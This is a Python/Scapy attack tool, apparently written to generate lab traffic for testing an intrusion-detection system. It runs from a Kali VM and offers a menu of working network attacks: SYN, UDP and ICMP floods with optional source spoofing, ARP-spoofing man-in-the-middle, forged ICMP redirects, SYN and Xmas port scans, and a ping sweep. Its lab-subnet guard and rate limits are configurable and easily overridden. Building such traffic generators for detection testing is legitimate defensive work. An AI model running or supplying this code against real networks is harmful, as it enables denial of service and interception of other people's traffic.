"""
attacker.py — Run on the Kali Linux VM (as root)
=================================================
Launches network attacks against the selected victim VM.
Windows is the default target, but TARGET_IP can point to the Ubuntu lab host too.

Usage:
    pip install scapy
    sudo python attacker.py

Targets:
    VICTIM_IP  = 192.168.56.20  (Windows 10 VM)
    GATEWAY_IP = 192.168.56.1   (Host machine / vboxnet0)
"""

import time
import sys
import threading
import os
import ipaddress
import subprocess

try:
    from scapy.all import (
        IP, TCP, UDP, ARP, Ether, ICMP,
        send, sendp, srp, sr1, get_if_hwaddr,
        RandIP, RandShort, getmacbyip, conf, get_if_list, get_if_addr
    )
except ImportError:
    print("[!] Scapy not installed. Run: pip install scapy")
    sys.exit(1)

# ── Configuration ─────────────────────────────────────────────────────────────
VICTIM_IP    = os.environ.get("TARGET_IP", "192.168.56.20")    # Default target (can be overridden interactively)
GATEWAY_IP   = "192.168.56.1"    # Host machine (vboxnet0)
VICTIM_PORT  = 80                 # Port to SYN flood
INTERFACE    = "eth0"             # Kali network interface (auto-detected if possible)
USE_SPOOFED_SRC = os.environ.get("USE_SPOOFED_SRC", "false").lower() in {"1", "true", "yes"}
SYN_FLOOD_PPS = int(os.environ.get("SYN_FLOOD_PPS", "50"))  # Packets per second (tunable; default 50)
LAB_SUBNET = os.environ.get("LAB_SUBNET", "192.168.56.0/24")


def _ip_in_lab_subnet(ip_str):
    try:
        return ipaddress.ip_address(ip_str) in ipaddress.ip_network(LAB_SUBNET, strict=False)
    except Exception:
        return False


def _is_target_live(ip_str):
    try:
        result = subprocess.run([
            "ping", "-c", "1", "-W", "1", ip_str
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        if result.returncode == 0:
            return True
    except Exception:
        pass

    try:
        return bool(getmacbyip(ip_str))
    except Exception:
        return False


def _ensure_target_ready(ip_str, label="Target"):
    if not ip_str:
        print(f"[!] {label} IP is required")
        return False
    if not _ip_in_lab_subnet(ip_str):
        print(f"[!] {label} {ip_str} is outside the allowed lab subnet {LAB_SUBNET}")
        return False
    if not _is_target_live(ip_str):
        print(f"[!] {label} {ip_str} did not answer reachability checks")
        return False
    return True
def _detect_iface():
    try:
        for name in get_if_list():
            try:
                ip = get_if_addr(name)
                if ip and ip.startswith("192.168.56."):
                    return name
            except Exception:
                continue
    except Exception:
        pass
    return INTERFACE

# ─────────────────────────────────────────────────────────────────────────────
# Attack 1 — SYN Flood
# ─────────────────────────────────────────────────────────────────────────────
def syn_flood(stop_event):
    """
    Sends bursts of TCP SYN packets to VICTIM_IP:VICTIM_PORT
    with randomised spoofed source IPs.
    The victim's SYN_RECV backlog fills up, making the port unresponsive.
    Throttled to SYN_FLOOD_PPS packets per second to avoid overwhelming the backend.
    """
    if not _ensure_target_ready(VICTIM_IP, "Target"):
        return

    iface = _detect_iface()
    print(f"[*] SYN Flood started → {VICTIM_IP}:{VICTIM_PORT} on {iface}")
    print(f"[*] Rate limit: {SYN_FLOOD_PPS} pkt/s (set SYN_FLOOD_PPS env var to change)")
    
    burst_size = max(1, SYN_FLOOD_PPS // 10)  # Send in small bursts
    delay_per_burst = burst_size / max(1, SYN_FLOOD_PPS)  # Delay between bursts
    total_sent = 0
    attacker_ip = get_if_addr(iface)

    while not stop_event.is_set():
        pkts = [
            IP(src=RandIP() if USE_SPOOFED_SRC else attacker_ip, dst=VICTIM_IP) /
            TCP(sport=RandShort(), dport=VICTIM_PORT, flags="S", seq=1000)
            for _ in range(burst_size)
        ]
        send(pkts, verbose=False, iface=iface)
        total_sent += burst_size
        print(f"  [SYN] Sent {total_sent:,} packets", end="\r")
        time.sleep(delay_per_burst)  # Throttle to avoid backend overload

    print(f"\n[*] SYN Flood stopped — total packets sent: {total_sent:,}")


# ─────────────────────────────────────────────────────────────────────────────
# Attack 2 — ARP Spoofing
# ─────────────────────────────────────────────────────────────────────────────
def arp_spoof(stop_event):
    """
    Poisons the ARP cache of both victim and gateway:
      - Tells victim: "Gateway IP is at MY MAC"
      - Tells gateway: "Victim IP is at MY MAC"
    All traffic between them now passes through Kali (MITM).
    """
    if not _ensure_target_ready(VICTIM_IP, "Target"):
        return

    print(f"[*] Resolving MACs...")
    iface = _detect_iface()
    victim_mac  = getmacbyip(VICTIM_IP)
    gateway_mac = getmacbyip(GATEWAY_IP)

    if not victim_mac:
        print(f"[!] Cannot resolve MAC for {VICTIM_IP} — is the VM reachable?")
        return
    if not gateway_mac:
        print(f"[!] Cannot resolve MAC for {GATEWAY_IP}")
        return

    my_mac = get_if_hwaddr(iface)
    print(f"[*] ARP Spoof started")
    print(f"    Victim  : {VICTIM_IP} ({victim_mac})")
    print(f"    Gateway : {GATEWAY_IP} ({gateway_mac})")
    print(f"    My MAC  : {my_mac}")
    count = 0

    while not stop_event.is_set():
        # Tell victim: "I am the gateway"
        send(ARP(op=2,
                 pdst=VICTIM_IP, hwdst=victim_mac,
                 psrc=GATEWAY_IP, hwsrc=my_mac),
             verbose=False, iface=iface)

        # Tell gateway: "I am the victim"
        send(ARP(op=2,
                 pdst=GATEWAY_IP, hwdst=gateway_mac,
                 psrc=VICTIM_IP, hwsrc=my_mac),
             verbose=False, iface=iface)

        count += 2
        print(f"  [ARP] Sent {count} poison packets", end="\r")
        time.sleep(1)

    # Restore ARP tables on stop
    print(f"\n[*] Restoring ARP tables...")
    for _ in range(5):
        send(ARP(op=2, pdst=VICTIM_IP,  hwdst=victim_mac,
                 psrc=GATEWAY_IP, hwsrc=gateway_mac), verbose=False)
        send(ARP(op=2, pdst=GATEWAY_IP, hwdst=gateway_mac,
                 psrc=VICTIM_IP,  hwsrc=victim_mac),  verbose=False)
    print("[*] ARP Spoof stopped — tables restored")


# ─────────────────────────────────────────────────────────────────────────────
# Attack 3 — ICMP Redirect
# ─────────────────────────────────────────────────────────────────────────────
def icmp_redirect(stop_event):
    """
    Sends forged ICMP Redirect (type=5, code=1) messages appearing
    to come from the gateway, instructing the victim to route traffic
    for 8.8.8.8 through Kali instead of the real gateway.
    """
    if not _ensure_target_ready(VICTIM_IP, "Target"):
        return

    iface = _detect_iface()
    my_ip = get_if_addr(iface)
    print(f"[*] ICMP Redirect started → telling {VICTIM_IP} to route via {my_ip} on {iface}")
    count = 0

    while not stop_event.is_set():
        pkt = (
            IP(src=GATEWAY_IP, dst=VICTIM_IP) /
            ICMP(type=5, code=1, gw=my_ip) /
            IP(src=VICTIM_IP, dst="8.8.8.8") /
            TCP(sport=1234, dport=80)
        )
        send(pkt, verbose=False, iface=iface)
        count += 1
        print(f"  [ICMP] Sent {count} redirect packets", end="\r")
        time.sleep(0.5)

    print(f"\n[*] ICMP Redirect stopped — total: {count} packets")


# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# Attack 4 — TCP port scan (SYN) — exercises port_sweep / host_sweep detection
# ─────────────────────────────────────────────────────────────────────────────
def port_scan(stop_event):
    if not _ensure_target_ready(VICTIM_IP, "Target"):
        return
    iface = _detect_iface()
    attacker_ip = get_if_addr(iface)
    ports = list(range(1, 1025))
    print(f"[*] SYN port scan → {VICTIM_IP} (ports 1-1024) on {iface}")
    sent = 0
    for port in ports:
        if stop_event.is_set():
            break
        send(IP(src=attacker_ip, dst=VICTIM_IP) / TCP(sport=RandShort(), dport=port, flags="S"),
             verbose=False, iface=iface)
        sent += 1
        print(f"  [SCAN] probed {sent} ports", end="\r")
        time.sleep(0.01)
    print(f"\n[*] Port scan stopped — {sent} ports probed")


# ─────────────────────────────────────────────────────────────────────────────
# Attack 5 — Xmas scan (FIN+PSH+URG) — exercises stealth_scan detection
# ─────────────────────────────────────────────────────────────────────────────
def xmas_scan(stop_event):
    if not _ensure_target_ready(VICTIM_IP, "Target"):
        return
    iface = _detect_iface()
    attacker_ip = get_if_addr(iface)
    print(f"[*] Xmas scan (FIN/PSH/URG) → {VICTIM_IP} on {iface}")
    sent = 0
    for port in range(1, 513):
        if stop_event.is_set():
            break
        send(IP(src=attacker_ip, dst=VICTIM_IP) / TCP(sport=RandShort(), dport=port, flags="FPU"),
             verbose=False, iface=iface)
        sent += 1
        print(f"  [XMAS] sent {sent}", end="\r")
        time.sleep(0.01)
    print(f"\n[*] Xmas scan stopped — {sent} packets")


# ─────────────────────────────────────────────────────────────────────────────
# Attack 6 — UDP flood — exercises udp_flood detection
# ─────────────────────────────────────────────────────────────────────────────
def udp_flood(stop_event):
    if not _ensure_target_ready(VICTIM_IP, "Target"):
        return
    iface = _detect_iface()
    attacker_ip = get_if_addr(iface)
    dport = int(os.environ.get("UDP_FLOOD_PORT", "53"))
    pps = int(os.environ.get("UDP_FLOOD_PPS", "100"))
    burst = max(1, pps // 10)
    print(f"[*] UDP flood → {VICTIM_IP}:{dport} on {iface} ({pps} pkt/s)")
    total = 0
    while not stop_event.is_set():
        pkts = [IP(src=RandIP() if USE_SPOOFED_SRC else attacker_ip, dst=VICTIM_IP) /
                UDP(sport=RandShort(), dport=dport) / (b"X" * 64) for _ in range(burst)]
        send(pkts, verbose=False, iface=iface)
        total += burst
        print(f"  [UDP] sent {total:,}", end="\r")
        time.sleep(burst / max(1, pps))
    print(f"\n[*] UDP flood stopped — {total:,} datagrams")


# ─────────────────────────────────────────────────────────────────────────────
# Attack 7 — ICMP flood — exercises icmp_flood detection
# ─────────────────────────────────────────────────────────────────────────────
def icmp_flood(stop_event):
    if not _ensure_target_ready(VICTIM_IP, "Target"):
        return
    iface = _detect_iface()
    attacker_ip = get_if_addr(iface)
    pps = int(os.environ.get("ICMP_FLOOD_PPS", "100"))
    burst = max(1, pps // 10)
    print(f"[*] ICMP flood → {VICTIM_IP} on {iface} ({pps} pkt/s)")
    total = 0
    while not stop_event.is_set():
        pkts = [IP(src=RandIP() if USE_SPOOFED_SRC else attacker_ip, dst=VICTIM_IP) /
                ICMP() / (b"X" * 56) for _ in range(burst)]
        send(pkts, verbose=False, iface=iface)
        total += burst
        print(f"  [ICMP] sent {total:,}", end="\r")
        time.sleep(burst / max(1, pps))
    print(f"\n[*] ICMP flood stopped — {total:,} packets")


# ─────────────────────────────────────────────────────────────────────────────
# Attack 8 — Ping sweep — exercises ping_sweep / host discovery detection
# ─────────────────────────────────────────────────────────────────────────────
def ping_sweep(stop_event):
    iface = _detect_iface()
    attacker_ip = get_if_addr(iface)
    net = ipaddress.ip_network(LAB_SUBNET, strict=False)
    print(f"[*] Ping sweep across {LAB_SUBNET} on {iface}")
    sent = 0
    for host in net.hosts():
        if stop_event.is_set():
            break
        send(IP(src=attacker_ip, dst=str(host)) / ICMP(), verbose=False, iface=iface)
        sent += 1
        print(f"  [SWEEP] pinged {sent} hosts", end="\r")
        time.sleep(0.02)
    print(f"\n[*] Ping sweep stopped — {sent} hosts")


# ─────────────────────────────────────────────────────────────────────────────
# Menu
# ─────────────────────────────────────────────────────────────────────────────
ATTACKS = {
    "1": ("SYN Flood",      syn_flood),
    "2": ("ARP Spoofing",   arp_spoof),
    "3": ("ICMP Redirect",  icmp_redirect),
    "4": ("TCP Port Scan",  port_scan),
    "5": ("Xmas Scan",      xmas_scan),
    "6": ("UDP Flood",      udp_flood),
    "7": ("ICMP Flood",     icmp_flood),
    "8": ("Ping Sweep",     ping_sweep),
}

def main():
    print("=" * 60)
    print("  Attacker — Kali VM")
    print("=" * 60)
    # Declare globals before use
    global VICTIM_IP

    # Allow user to enter a custom target IP interactively
    default_target = VICTIM_IP
    while True:
        target_in = input(f"Target IP (press Enter for {default_target}): ").strip()
        if not target_in:
            target = default_target
            break
        try:
            ipaddress.ip_address(target_in)
            target = target_in
            break
        except Exception:
            print("[!] Invalid IP address, try again.")

    # Set the global VICTIM_IP to the chosen target
    VICTIM_IP = target

    if not _ensure_target_ready(VICTIM_IP, "Target"):
        sys.exit(1)

    print(f"  Victim  : {VICTIM_IP}")
    print(f"  Gateway : {GATEWAY_IP}")
    print(f"  Interface: {INTERFACE}")
    print("=" * 60)
    print()
    for key, (name, _) in ATTACKS.items():
        print(f"  {key}. {name}")
    print()

    choice = input("Select attack: ").strip()
    if choice not in ATTACKS:
        print("[!] Invalid choice")
        sys.exit(1)

    name, fn = ATTACKS[choice]
    stop = threading.Event()
    thread = threading.Thread(target=fn, args=(stop,), daemon=True)
    thread.start()

    print(f"\n[*] {name} running. Press Enter to stop...")
    try:
        input()
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        thread.join(timeout=5)
        print(f"[*] Done.")


if __name__ == "__main__":
    if sys.platform != "win32":
        import os
        if os.geteuid() != 0:
            print("[!] Must run as root: sudo python attacker.py")
            sys.exit(1)
    main()
